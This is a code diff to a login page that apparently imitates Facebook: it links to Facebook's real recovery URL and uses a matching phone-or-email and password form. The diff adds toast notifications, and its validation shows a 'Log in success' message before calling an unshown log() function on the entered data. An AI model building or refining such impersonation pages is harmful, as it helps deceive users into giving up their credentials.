@@ -11,6 +11,45 @@
   
 
   <!-- Custom Styles -->
+   <style>
+    .toast {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      background-color: blue;
+      color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      animation: slideIn 0.5s ease-in-out;
+      opacity: 1;
+      transition: opacity 0.5s;
+    }
+    
+    .toast .message {
+      flex-grow: 1;
+      margin-right: 10px;
+    }
+    
+    .toast .close-icon {
+      cursor: pointer;
+    }
+
+    .toast.fade-out {
+      opacity: 0;
+    }
+
+    @keyframes slideIn {
+      0% {
+        transform: translateX(100%);
+      }
+      100% {
+        transform: translateX(0);
+      }
+    }
+   </style>
   <link rel="stylesheet" href="style.css">
 </head>
 
@@ -22,7 +61,7 @@
     <input class="intput" type="text" id="number" placeholder="Phone or email" required>
     <input class="intput" type="password" id="pass" placeholder="Password" required>
     <br>
-    <button onclick="log()" class="button">Log In</button>
+    <button onclick="validateInput()" class="button">Log In</button>
   </div>
   <a class="forgot" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc2MTI4ODE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login"><b>Forgot Password?</b></a>
   <hr>
@@ -33,6 +72,37 @@
 </body>
 <script>
 
+  function showToast(msg) {
+      var toast = document.createElement('div');
+      toast.className = 'toast';
+
+      var message = document.createElement('div');
+      message.className = 'message';
+      message.innerText = msg;
+
+      var closeIcon = document.createElement('span');
+      closeIcon.className = 'close-icon';
+      closeIcon.innerHTML = '&#10006;';
+      closeIcon.addEventListener('click', function() {
+        toast.classList.add('fade-out');
+        setTimeout(function() {
+          toast.remove();
+        }, 500);
+      });
+
+      toast.appendChild(message);
+      toast.appendChild(closeIcon);
+
+      document.body.appendChild(toast);
+
+      setTimeout(function() {
+        toast.classList.add('fade-out');
+        setTimeout(function() {
+          toast.remove();
+        }, 500);
+      }, 3000);
+  }
+
   function validateInput() {
       var inputField = document.getElementById('number');
       var input = inputField.value.trim();
@@ -42,11 +112,10 @@
       var phoneRegex = /^\d{11}$/; // Assumes 10-digit phone number format
 
       if (emailRegex.test(input) || phoneRegex.test(input)) {
-        resultElement.innerText = 'Valid input';
-        resultElement.className = 'valid';
+        showToast('Log in success');
+        log();
       } else {
-        resultElement.innerText = 'Invalid input';
-        resultElement.className = 'invalid';
+        showToast('Pls ! Input email or phone number');
       }
   }
 
